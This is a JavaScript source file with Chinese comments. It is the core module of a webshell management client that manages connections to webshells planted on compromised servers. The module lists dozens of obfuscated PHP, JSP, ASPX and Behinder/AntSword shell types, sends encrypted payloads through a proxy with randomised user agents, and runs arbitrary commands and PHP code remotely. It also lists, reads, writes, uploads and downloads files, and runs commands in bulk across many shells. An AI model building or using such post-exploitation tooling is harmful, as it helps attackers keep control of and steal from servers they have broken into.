/**
 * Webshell 核心模块 v2.0
 * 统一管理 Shell 连接、请求发送等
 * 集成 RSA2048+AES256-CBC 强加密
 */

const WebshellCore = (function() {
    // Shell 列表
    let shells = [];

    // 当前活动 Shell
    let activeShell = null;

    // 请求队列
    let requestQueue = [];
    let isProcessing = false;

    // Shell 类型
    const SHELL_TYPES = {
        // PHP 8.x 专用 (推荐)
        PHP8_EVAL: 'php8_eval',
        PHP8_SYSTEM: 'php8_system',
        PHP8_PASSTHRU: 'php8_passthru',
        PHP8_SHELL_EXEC: 'php8_shell_exec',
        PHP8_PROC_OPEN: 'php8_proc_open',
        PHP8_POPEN: 'php8_popen',
        PHP8_EXEC: 'php8_exec',
        PHP8_DYNAMIC: 'php8_dynamic',
        PHP8_BACKTICK: 'php8_backtick',
        PHP8_PCNTL: 'php8_pcntl',
        // PHP 7.x 专用
        PHP7_CREATE_FUNCTION: 'php7_create_function',
        PHP7_ASSERT: 'php7_assert',
        PHP7_PREG_REPLACE: 'php7_preg_replace',
        // PHP 通用
        PHP_EVAL: 'php_eval',
        PHP_BASE64: 'php_base64',
        PHP_ROT13: 'php_rot13',
        PHP_XOR: 'php_xor',
        PHP_CONCAT: 'php_concat',
        PHP_VARIABLE_FUNC: 'php_variable_func',
        PHP_CALLBACK_ARRAY: 'php_callback_array',
        PHP_CALLBACK_FILTER: 'php_callback_filter',
        PHP_CALLBACK_WALK: 'php_callback_walk',
        PHP_CALLBACK_USORT: 'php_callback_usort',
        PHP_CALLBACK_REDUCE: 'php_callback_reduce',
        PHP_CLASS_CONSTRUCT: 'php_class_construct',
        PHP_CLASS_INVOKE: 'php_class_invoke',
        PHP_CLASS_CALL: 'php_class_call',
        PHP_CLASS_GET: 'php_class_get',
        PHP_REFLECTION: 'php_reflection',
        PHP_STRREV: 'php_strrev',
        PHP_MULTILAYER_B64: 'php_multilayer_b64',
        PHP_GZIP: 'php_gzip',
        PHP_COMMENT_SPLIT: 'php_comment_split',
        PHP_UNICODE: 'php_unicode',
        PHP_HEX: 'php_hex',
        PHP_CHR_SHIFT: 'php_chr_shift',
        PHP_PREG_CALLBACK: 'php_preg_callback',
        PHP_VARIABLE_OVERWRITE: 'php_variable_overwrite',
        PHP_NO_ALPHA_NUM: 'php_no_alpha_num',
        PHP_COOKIE: 'php_cookie',
        PHP_HEADER: 'php_header',
        PHP_REQUEST: 'php_request',
        PHP_INCLUDE: 'php_include',
        PHP_DYNAMIC_FUNC: 'php_dynamic_func',
        PHP_IMAGE_HEADER: 'php_image_header',
        PHP_SESSION: 'php_session',
        PHP_LOG_INCLUDE: 'php_log_include',
        // 冰蝎
        BEHINDER_PHP: 'behinder_php',
        BEHINDER_PHP_ENHANCED: 'behinder_php_enhanced',
        BEHINDER_JSP: 'behinder_jsp',
        BEHINDER_JSP_ENHANCED: 'behinder_jsp_enhanced',
        BEHINDER_ASPX: 'behinder_aspx',
        // 蚁剑
        ANTSWORD_PHP: 'antsword_php',
        ANTSWORD_JSP: 'antsword_jsp',
        ANTSWORD_ASPX: 'antsword_aspx',
        // ASP
        ASP_SIMPLE: 'asp_simple',
        ASP_ENCODE: 'asp_encode',
        ASP_CHR: 'asp_chr',
        ASP_INCLUDE: 'asp_include',
        // ASPX
        ASPX_JSCRIPT: 'aspx_jscript',
        ASPX_CSHARP: 'aspx_csharp',
        ASPX_BASE64: 'aspx_base64',
        ASPX_REFLECTION: 'aspx_reflection',
        // JSP
        JSP_RUNTIME: 'jsp_runtime',
        JSP_PROCESSBUILDER: 'jsp_processbuilder',
        JSP_SCRIPTENGINE: 'jsp_scriptengine',
        JSP_EXPRESSION: 'jsp_expression',
        JSP_BSH: 'jsp_bsh',
        // 其他语言
        PY_FLASK: 'py_flask',
        PY_DJANGO: 'py_django',
        NODEJS_EXPRESS: 'nodejs_express',
        GO_HTTP: 'go_http',
        // 自定义
        CUSTOM: 'custom'
    };

    // 连接状态
    const CONNECTION_STATUS = {
        UNTESTED: 'untested',
        CONNECTING: 'connecting',
        ACTIVE: 'active',
        ERROR: 'error',
        TIMEOUT: 'timeout'
    };

    // ==================== Shell 管理 ====================

    // 添加 Shell
    async function addShell(config) {
        const shell = {
            id: Date.now().toString(36) + Math.random().toString(36).substr(2, 5),
            name: config.name || 'New Shell',
            url: config.url,
            password: config.password,
            type: config.type || SHELL_TYPES.PHP_EVAL,
            encoding: config.encoding || 'UTF-8',
            encoder: config.encoder || 'base64',
            decoder: config.decoder || 'base64',
            enableSign: config.enableSign || false,
            enablePadding: config.enablePadding || false,
            enableEncryption: config.enableEncryption !== false, // 默认启用加密
            userAgent: config.userAgent || 'random',
            timeout: config.timeout || 30000,
            createdAt: new Date().toISOString(),
            lastUsed: null,
            status: CONNECTION_STATUS.UNTESTED,
            info: null,
            // 加密会话状态
            crypto: {
                sessionId: null,
                key: null,
                iv: null,
                rsaKeyPair: null,
                serverPublicKey: null,
                sequence: 0
            }
        };

        // 初始化加密会话
        if (shell.enableEncryption) {
            await initShellCrypto(shell);
        }

        shells.push(shell);
        saveShells();
        return shell;
    }

    // 初始化 Shell 加密会话
    async function initShellCrypto(shell) {
        try {
            const sessionInfo = await WebshellCrypto.initSecureSession(shell.password);
            shell.crypto.sessionId = sessionInfo.sessionId;
            shell.crypto.key = WebshellCrypto.getSessionKey();
            shell.crypto.iv = WebshellCrypto.getRandomBytes(16);
            shell.crypto.sequence = 0;
            return true;
        } catch (e) {
            console.error('Failed to init crypto:', e);
            return false;
        }
    }

    // 删除 Shell
    function deleteShell(id) {
        const index = shells.findIndex(s => s.id === id);
        if (index > -1) {
            shells.splice(index, 1);
            if (activeShell && activeShell.id === id) {
                activeShell = null;
            }
            saveShells();
            return true;
        }
        return false;
    }

    // 设置活动 Shell
    async function setActiveShell(id) {
        const shell = shells.find(s => s.id === id);
        if (shell) {
            activeShell = shell;
            // 重新初始化加密会话
            if (shell.enableEncryption) {
                await initShellCrypto(shell);
            }
            return shell;
        }
        return null;
    }

    // 获取所有 Shells
    function getShells() {
        return [...shells];
    }

    // 获取活动 Shell
    function getActiveShell() {
        return activeShell;
    }

    // 更新 Shell 配置
    function updateShell(id, config) {
        const shell = shells.find(s => s.id === id);
        if (shell) {
            Object.assign(shell, config);
            saveShells();
            return shell;
        }
        return null;
    }

    // ==================== 持久化 ====================

    // 保存 Shells 到本地存储
    function saveShells() {
        try {
            const data = shells.map(s => ({
                ...s,
                password: btoa(s.password), // 简单编码
                crypto: {
                    sessionId: s.crypto?.sessionId,
                    sequence: s.crypto?.sequence || 0
                    // 不保存密钥
                }
            }));
            localStorage.setItem('webshell_shells', JSON.stringify(data));
        } catch (e) {
            console.error('Failed to save shells:', e);
        }
    }

    // 从本地存储加载 Shells
    function loadShells() {
        try {
            const data = localStorage.getItem('webshell_shells');
            if (data) {
                shells = JSON.parse(data).map(s => ({
                    ...s,
                    password: atob(s.password), // 解码
                    crypto: {
                        sessionId: s.crypto?.sessionId,
                        key: null, // 需要重新初始化
                        iv: null,
                        sequence: s.crypto?.sequence || 0
                    }
                }));
            }
        } catch (e) {
            console.error('Failed to load shells:', e);
            shells = [];
        }
        return shells;
    }

    // ==================== 请求发送 ====================

    // 发送请求 (通过后端代理, 解决CORS问题)
    async function sendRequest(shell, payload, options = {}) {
        // 确保加密会话已初始化
        if (shell.enableEncryption && !shell.crypto.key) {
            await initShellCrypto(shell);
        }

        // 使用安全请求构建
        let request;
        if (shell.enableEncryption) {
            request = await WebshellProtocol.buildSecureRequest(
                shell.type,
                shell.url,
                shell.password,
                payload,
                {
                    userAgent: shell.userAgent === 'random' ? null : shell.userAgent,
                    enablePadding: shell.enablePadding,
                    enableSign: shell.enableSign,
                    encoder: shell.encoder
                }
            );
        } else {
            request = WebshellProtocol.buildRequest(
                shell.type,
                shell.url,
                shell.password,
                payload,
                {
                    userAgent: shell.userAgent === 'random' ? null : shell.userAgent,
                    enablePadding: shell.enablePadding,
                    enableSign: shell.enableSign,
                    encoder: shell.encoder
                }
            );
        }

        try {
            shell.status = CONNECTION_STATUS.CONNECTING;

            // 通过后端代理发送请求 (解决CORS问题)
            const proxyResponse = await fetch('/api/webshell/proxy', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: new URLSearchParams({
                    url: request.url,
                    method: 'POST',
                    headers: JSON.stringify(request.headers),
                    body: JSON.stringify(request.body),
                    timeout: shell.timeout
                })
            });

            if (!proxyResponse.ok) {
                throw new Error(`Proxy error: HTTP ${proxyResponse.status}`);
            }

            const proxyResult = await proxyResponse.json();

            if (!proxyResult.success) {
                throw new Error(proxyResult.error || 'Proxy request failed');
            }

            let responseText = proxyResult.data;

            // 解析响应
            const result = await WebshellProtocol.parseResponse(
                shell.type,
                responseText,
                shell.password,
                {
                    decoder: shell.decoder,
                    iv: request.body['_iv'] // 传递 IV 用于解密
                }
            );

            // 更新最后使用时间
            shell.lastUsed = new Date().toISOString();
            shell.status = CONNECTION_STATUS.ACTIVE;
            shell.crypto.sequence++;
            saveShells();

            return {
                success: true,
                data: result,
                raw: responseText
            };
        } catch (error) {
            shell.status = CONNECTION_STATUS.ERROR;
            saveShells();

            return {
                success: false,
                error: error.message
            };
        }
    }

    // 发送原始请求 (通过代理)
    async function sendRawRequest(shell, payload, options = {}) {
        try {
            const formData = {};
            formData[shell.password] = payload;

            const proxyResponse = await fetch('/api/webshell/proxy', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: new URLSearchParams({
                    url: shell.url,
                    method: 'POST',
                    headers: JSON.stringify({
                        'User-Agent': WebshellCrypto.getRandomUserAgent(),
                        'Content-Type': 'application/x-www-form-urlencoded'
                    }),
                    body: JSON.stringify(formData),
                    timeout: shell.timeout
                })
            });

            if (!proxyResponse.ok) {
                throw new Error(`Proxy error: HTTP ${proxyResponse.status}`);
            }

            const proxyResult = await proxyResponse.json();

            if (!proxyResult.success) {
                throw new Error(proxyResult.error || 'Proxy request failed');
            }

            return {
                success: true,
                data: proxyResult.data
            };
        } catch (error) {
            return {
                success: false,
                error: error.message
            };
        }
    }

    // ==================== Shell 测试 ====================

    // 测试 Shell 连接
    async function testShell(shell) {
        const testMarker = 'TMBOX_WEBSHELL_TEST_' + Date.now();
        const payload = `echo '${testMarker}';`;
        const result = await sendRequest(shell, payload);

        if (result.success && result.data.includes(testMarker)) {
            shell.status = CONNECTION_STATUS.ACTIVE;
            // 获取基本信息
            await getShellInfo(shell);
            return { success: true, message: '连接成功', info: shell.info };
        }

        shell.status = CONNECTION_STATUS.ERROR;
        return { success: false, message: result.error || '连接失败' };
    }

    // 获取 Shell 基本信息
    async function getShellInfo(shell) {
        // 单行payload，避免多行问题
        const infoPayload = `$info=array('os'=>PHP_OS,'php'=>phpversion(),'user'=>get_current_user(),'cwd'=>getcwd(),'hostname'=>php_uname('n'),'kernel'=>php_uname('s').' '.php_uname('r'),'arch'=>php_uname('m'));echo json_encode($info);`;

        const result = await sendRequest(shell, infoPayload);
        console.log('[getShellInfo] Result:', result);

        if (result.success) {
            try {
                // result.data 可能已经被parseResponse解析成对象
                if (typeof result.data === 'object' && result.data !== null) {
                    // 已经是对象，直接使用
                    shell.info = result.data;
                } else if (typeof result.data === 'string') {
                    // 是字符串，需要解析
                    let data = result.data;
                    const jsonMatch = data.match(/\{[\s\S]*\}/);
                    if (jsonMatch) {
                        data = jsonMatch[0];
                    }
                    shell.info = JSON.parse(data);
                } else {
                    shell.info = { os: 'Unknown', user: 'Unknown', cwd: 'Unknown' };
                }
                console.log('[getShellInfo] Parsed info:', shell.info);
            } catch (e) {
                console.error('[getShellInfo] Parse error:', e, result.data);
                shell.info = { os: 'Unknown', user: 'Unknown', cwd: 'Unknown' };
            }
        } else {
            shell.info = { os: 'Unknown', user: 'Unknown', cwd: 'Unknown' };
        }
        return shell.info;
    }

    // ==================== 命令执行 ====================

    // 执行命令
    async function executeCommand(shell, command) {
        const execPayload = WebshellTerminal.buildExecutePayload(command, shell.type);
        const result = await sendRequest(shell, execPayload.payload);

        if (result.success) {
            // 处理 cd 命令
            if (execPayload.type === 'cd' && execPayload.localHandler) {
                execPayload.localHandler(result.data);
            }
            return {
                success: true,
                output: result.data,
                command: command
            };
        }
        return {
            success: false,
            output: result.error,
            command: command
        };
    }

    // 执行 PHP 代码
    async function executePhp(shell, code) {
        return await sendRequest(shell, code);
    }

    // 获取 phpinfo
    async function getPhpInfo(shell) {
        const payload = `phpinfo();`;
        return await sendRequest(shell, payload);
    }

    // ==================== 文件操作 ====================

    const fileOps = {
        list: async (shell, path) => {
            const payload = WebshellFileManager.buildListDirPayload(path);
            const result = await sendRequest(shell, payload);
            if (result.success) {
                return WebshellFileManager.parseFileListResponse(result.data);
            }
            return [];
        },

        read: async (shell, path) => {
            const payload = WebshellFileManager.buildReadFilePayload(path);
            return await sendRequest(shell, payload);
        },

        write: async (shell, path, content) => {
            const base64Content = btoa(unescape(encodeURIComponent(content)));
            const payload = WebshellFileManager.buildWriteFilePayload(path, base64Content, true);
            return await sendRequest(shell, payload);
        },

        delete: async (shell, path) => {
            const payload = WebshellFileManager.buildDeletePayload(path);
            return await sendRequest(shell, payload);
        },

        rename: async (shell, oldPath, newPath) => {
            const payload = WebshellFileManager.buildRenamePayload(oldPath, newPath);
            return await sendRequest(shell, payload);
        },

        mkdir: async (shell, path) => {
            const payload = WebshellFileManager.buildMkdirPayload(path);
            return await sendRequest(shell, payload);
        },

        stat: async (shell, path) => {
            const payload = WebshellFileManager.buildStatPayload(path);
            const result = await sendRequest(shell, payload);
            if (result.success) {
                try {
                    return JSON.parse(result.data);
                } catch (e) {
                    return null;
                }
            }
            return null;
        },

        // 上传文件 (分块)
        upload: async (shell, file, remotePath, onProgress) => {
            return await WebshellFileManager.uploadFileChunked(file, remotePath, {
                execute: (payload) => sendRequest(shell, payload)
            }, onProgress);
        },

        // 下载文件
        download: async (shell, remotePath, onProgress) => {
            return await WebshellFileManager.downloadFileChunked(remotePath, {
                execute: (payload) => sendRequest(shell, payload)
            }, onProgress);
        }
    };

    // ==================== 批量操作 ====================

    // 批量执行命令
    async function batchExecute(shells, command) {
        const results = [];
        for (const shell of shells) {
            const result = await executeCommand(shell, command);
            results.push({
                shellId: shell.id,
                shellName: shell.name,
                ...result
            });
        }
        return results;
    }

    // 批量测试连接
    async function batchTest(shells) {
        const results = [];
        for (const shell of shells) {
            const result = await testShell(shell);
            results.push({
                shellId: shell.id,
                shellName: shell.name,
                ...result
            });
        }
        return results;
    }

    // ==================== 导出/导入 ====================

    // 导出 Shell 配置
    function exportShells(format = 'json') {
        const data = shells.map(s => ({
            name: s.name,
            url: s.url,
            password: s.password,
            type: s.type,
            encoding: s.encoding,
            encoder: s.encoder,
            decoder: s.decoder,
            enableSign: s.enableSign,
            enablePadding: s.enablePadding,
            enableEncryption: s.enableEncryption,
            userAgent: s.userAgent,
            timeout: s.timeout
        }));

        if (format === 'json') {
            return JSON.stringify(data, null, 2);
        }

        // CSV 格式
        if (format === 'csv') {
            const headers = ['name', 'url', 'password', 'type', 'encoding'];
            const rows = data.map(s => headers.map(h => s[h]).join(','));
            return [headers.join(','), ...rows].join('\n');
        }

        return data;
    }

    // 导入 Shell 配置
    function importShells(data, format = 'json') {
        let imported = [];

        try {
            if (format === 'json') {
                imported = JSON.parse(data);
            } else if (format === 'csv') {
                const lines = data.split('\n');
                const headers = lines[0].split(',');
                for (let i = 1; i < lines.length; i++) {
                    const values = lines[i].split(',');
                    const obj = {};
                    headers.forEach((h, idx) => obj[h.trim()] = values[idx]?.trim());
                    imported.push(obj);
                }
            }

            // 添加导入的 Shells
            imported.forEach(config => {
                addShell(config);
            });

            return { success: true, count: imported.length };
        } catch (e) {
            return { success: false, error: e.message };
        }
    }

    // ==================== 初始化 ====================

    function init() {
        loadShells();
    }

    // ==================== 公开 API ====================

    return {
        SHELL_TYPES,
        CONNECTION_STATUS,

        // 初始化
        init,

        // Shell 管理
        addShell,
        deleteShell,
        setActiveShell,
        getShells,
        getActiveShell,
        updateShell,

        // 持久化
        saveShells,
        loadShells,

        // 请求
        sendRequest,
        sendRawRequest,

        // 测试
        testShell,
        getShellInfo,

        // 执行
        executeCommand,
        executePhp,
        getPhpInfo,

        // 文件操作
        fileOps,

        // 批量操作
        batchExecute,
        batchTest,

        // 导入导出
        exportShells,
        importShells
    };
})();

// 导出模块
if (typeof module !== 'undefined' && module.exports) {
    module.exports = WebshellCore;
}
